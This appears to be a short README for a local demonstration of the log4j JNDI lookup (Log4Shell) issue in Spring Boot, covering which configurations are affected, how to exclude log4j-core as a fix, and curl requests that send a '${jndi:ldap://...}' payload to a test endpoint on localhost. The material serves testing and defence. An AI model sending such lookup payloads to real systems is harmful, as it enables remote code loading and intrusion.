### log4j lookup problem demonstration for spring projects

#### This issue will not affect spring projects with default configurations. Spring uses a logback by default.

#### To use log4j you must exclude 'spring-boot-starter-logging' and include 'log4j'
    dependencies {
        implementation 'org.springframework.boot:spring-boot-starter-log4j2:2.5.1'
    }
    configurations {
        all*.exclude module: 'spring-boot-starter-logging'
    }

#### Don't forget only log4j-core impacted with this issue. You can stop this issue by excluding 'log4j-core'. 
    configurations {
        all*.exclude module: 'log4j-core'
    }

Use next method for investigations.

http://localhost:8080/api/infected-method
cardNumber: ${jndi:ldap://localhost:8082/api/long-wait}

####Curl request example
    
    curl --location --request GET 'localhost:8080/api/infected-method' --form 'cardNumber=${jndi:ldap://localhost:8082/api/long-wait}'
    
    curl --location --request GET 'localhost:8080/api/infected-method?cardNumber=%24%7Bjndi%3Aldap%3A%2F%2Flocalhost%3A8082%2Fapi%2Flong-wait%7D'
